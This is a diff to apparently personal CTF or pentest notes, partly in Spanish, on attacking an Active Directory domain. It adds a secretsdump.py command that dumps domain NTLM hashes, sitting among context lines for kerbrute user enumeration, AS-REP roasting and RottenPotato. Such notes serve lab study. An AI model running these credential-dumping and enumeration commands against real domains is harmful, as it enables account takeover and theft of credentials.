@@ -106,6 +106,19 @@ kerbrute userenum -d DNS /usr/share/seclists/Usernames/xato-net-10-million-usern
 python3 GetNPUsers.py DNS/ -usersfile users.txt -dc-ip IP -format john -outputfile hashes.txt
 ```
 
+#### svc_loanmgr
+
+con el nombre busque en google tal cual **svc_loanmgr privilage escalation** y encontre lo siguiente:
+
+> [https://www.puckiestyle.nl/aclpwn-py/](https://www.puckiestyle.nl/aclpwn-py/)
+
+> [https://github.com/BloodHoundAD/BloodHound](https://github.com/BloodHoundAD/BloodHound)
+
+#### secret dump 
+```Python
+secretsdump.py -just-dc-ntlm DNS/USER:"PASSWORD"@IP
+```
+
 #### rottenPotato
 SeImpersonatePrivilege token, which means that this machine is going to be vulnerable to the RottenPotato exploit
 [RottenPotato](https://github.com/ohpe/juicy-potato/releases)
